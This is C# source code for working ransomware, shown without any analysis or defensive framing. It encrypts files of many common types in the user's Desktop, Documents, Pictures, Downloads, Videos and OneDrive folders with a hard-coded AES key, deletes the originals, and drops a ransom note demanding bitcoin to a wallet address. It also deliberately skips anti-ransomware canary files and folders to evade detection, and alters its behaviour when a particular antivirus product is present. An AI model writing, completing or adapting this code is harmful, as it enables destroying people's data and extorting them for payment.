using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32;
using System.Reflection;


static class Program
{
    [STAThread]
    static void Main(string[] args)
    {
        try
        {
            Locker.EncryptFileSystem();
            var notePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + "!!! OPEN ME !!!.txt";
            var note = "Y 0 u R     F i 1 e S     R     3 n C r y P t 3 d !     M u a h a h a h a h a h a h a h ah a !!!!!!\r\n2     d 3 C r y P t    y 0 u R     F i 1 e S     P 1 e a s e     s 3 n D     .2     B i T c 0 i N   (b t C)     t o     1FxySVgsce1wzRRWFNSCkw5vzsKmhqf82";
            System.IO.File.WriteAllText(notePath, note);
        }
        catch
        {
        }
    }
}

internal static class Config
{
    internal const string EncryptionFileExtension = @".lol";
    internal const int MaxFilesizeToEncryptInBytes = 10000000;
    internal const string EncryptionPassword = @"OMGOMGOMGLV2PATCHER111==";
}

internal static class Locker
{
    private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();

    private const string EncryptionFileExtension = Config.EncryptionFileExtension;
    private const string EncryptionPassword = Config.EncryptionPassword;

    private static HashSet<string> DirectoriesToEncrypt = new HashSet<string>()
    {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Desktop"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Videos"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Pictures"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive")
    };
    
    internal static void EncryptFileSystem()
    {
        var extensionsToEncrypt = new HashSet<string>(GetExtensionsToEncrypt());

        foreach (var directory in DirectoriesToEncrypt)
        {
            EncryptFiles(directory, EncryptionFileExtension, extensionsToEncrypt);
        }

        foreach (var file in EncryptedFiles)
        {
            try
            {
                File.Delete(file);
            }
            catch
            {
            }
        }
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
        var extensionsToEncrypt = new HashSet<string>();

        foreach (
            var ext in
                Resources.ExtensionsToEncrypt.Split(new[] { Environment.NewLine, " " },
                    StringSplitOptions.RemoveEmptyEntries).ToList())
        {
            extensionsToEncrypt.Add(ext.Trim());
        }

        extensionsToEncrypt.Remove(EncryptionFileExtension);

        return extensionsToEncrypt;
    }

    private static void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt)
    {
        foreach (var file in
            (from file in Directory.GetFiles(dirPath) from ext in extensionsToEncrypt where file.EndsWith(ext) select file)
                .Select(file => new { file, fi = new FileInfo(file) })
                .Where(@t => @t.fi.Length < 10000000)
                .Select(@t => @t.file))
        {
            try
            {
                if (file.StartsWith(@"C:\Windows", StringComparison.InvariantCultureIgnoreCase) || file.StartsWith(@"C:\Program", StringComparison.InvariantCultureIgnoreCase) || file.ToLower().Contains("appdata"))
                {
                    continue;
                }

                var fi = new FileInfo(file);

                var rw_Xdir = new DirectoryInfo("C:\\").GetDirectories().FirstOrDefault(x => x.Name.StartsWith("X"));
                if (!Equals(rw_Xdir, default(DirectoryInfo)))
                {
                    var fii = new FileInfo(file);
                    var dir = fii.Directory;

                    if (dir.Name.Equals("!This folder protects against Ransomware. Just leave it here") || dir.Name.EndsWith(rw_Xdir.Name.Substring(1)))
                    {
                        continue;
                    }
                }

                if (fi.Name.StartsWith("ZZZZZ") || fi.Name.StartsWith("!!!!!"))
                {
                    continue;
                }

                if (fi.Name.ToLower().Contains("don't erase") || fi.Name.ToLower().Contains("don't remove") || fi.Name.ToLower().Contains("don't discard") || fi.Name.ToLower().Contains("don't delete") || fi.Name.ToLower().Contains("do not erase") || fi.Name.ToLower().Contains("do not remove") || fi.Name.ToLower().Contains("do not discard") || fi.Name.ToLower().Contains("do not delete") || fi.Name.ToLower().Contains("do notdelete") || fi.Name.ToLower().Contains("do notdiscard") || fi.Name.ToLower().Contains("do notremove") || fi.Name.ToLower().Contains("do noterase") || fi.Name.ToLower().Contains("do not-delete") || fi.Name.ToLower().Contains("do not-discard") || fi.Name.ToLower().Contains("do not-remove") || fi.Name.ToLower().Contains("do not-erase") || fi.Name.ToLower().Contains("do not_delete") || fi.Name.ToLower().Contains("do not_discard") || fi.Name.ToLower().Contains("do not_remove") || fi.Name.ToLower().Contains("do not_erase") || fi.Name.ToLower().Contains("don'tdelete") || fi.Name.ToLower().Contains("don'tdiscard") || fi.Name.ToLower().Contains("don'tremove") || fi.Name.ToLower().Contains("don'terase") || fi.Name.ToLower().Contains("don't-delete") || fi.Name.ToLower().Contains("don't-discard") || fi.Name.ToLower().Contains("don't-remove") || fi.Name.ToLower().Contains("don't-erase") || fi.Name.ToLower().Contains("don't_delete") || fi.Name.ToLower().Contains("don't_discard") || fi.Name.ToLower().Contains("don't_remove") || fi.Name.ToLower().Contains("don't_erase"))
                {
                    continue;
                }

                if (fi.Name.StartsWith("$"))
                {
                    continue;
                }

                var renamedFile = file;

                if (System.IO.Directory.Exists("C:\\Program Files\\G Data") || System.IO.Directory.Exists("C:\\Program Files (x86)\\G Data"))
                {
                }
                else
                {
                    renamedFile += ".olo";
                    System.IO.File.Move(file, renamedFile);
                }

                if (EncryptFile(renamedFile, encryptionExtension))
                {
                    EncryptedFiles.Add(renamedFile);
                }
            }
            catch
            {
            }
        }
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
        try
        {
            if (path.StartsWith(@"C:\Windows", StringComparison.InvariantCultureIgnoreCase) || path.StartsWith(@"C:\Program", StringComparison.InvariantCultureIgnoreCase) || path.ToLower().Contains("appdata"))
                return false;

            using (var aes = new AesCryptoServiceProvider())
            {
                aes.Key = Convert.FromBase64String(EncryptionPassword);
                aes.IV = new byte[] { 0, 1, 0, 3, 5, 3, 0, 1, 0, 0, 2, 0, 6, 7, 6, 0 };
                EncryptFile(aes, path, path + encryptionExtension);
            }
        }
        catch
        {
            return false;
        }
        try
        {
        }
        catch (Exception)
        {
            return false;
        }
        return true;
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
        var buffer = new byte[65536];

        using (var streamIn = new FileStream(inputFile, FileMode.Open))
        using (var streamOut = new FileStream(outputFile, FileMode.Create))
        using (var encrypt = new CryptoStream(streamOut, alg.CreateEncryptor(), CryptoStreamMode.Write))
        {
            int bytesRead;
            do
            {
                bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                if (bytesRead != 0)
                    encrypt.Write(buffer, 0, bytesRead);
            }
            while (bytesRead != 0);
        }
    }
}


internal class Resources
{
    internal static string ExtensionsToEncrypt
    {
        get
        {
            return ".jpg .jpeg .raw .tif .gif .png .bmp .3dm .max .accdb .db .dbf .mdb .pdb .sql .dwg .dxf .c .cpp .cs .h .php .asp .rb .java .jar .class .py .js .aaf .aep .aepx .plb .prel .prproj .aet .ppj .psd .indd .indl .indt .indb .inx .idml .pmd .xqx .xqx .ai .eps .ps .svg .swf .fla .as3 .as .txt .doc .dot .docx .docm .dotx .dotm .docb .rtf .wpd .wps .msg .pdf .xls .xlt .xlm .xlsx .xlsm .xltx .xltm .xlsb .xla .xlam .xll .xlw .ppt .pot .pps .pptx .pptm .potx .potm .ppam .ppsx .ppsm .sldx .sldm .wav .mp3 .aif .iff .m3u .m4u .mid .mpa .wma .ra .avi .mov .mp4 .3gp .mpeg .3g2 .asf .asx .flv .mpg .wmv .vob .m3u8 .mkv .dat .csv .efx .sdf .vcf .xml .ses .rar .zip .7zip";
        }
    }

}
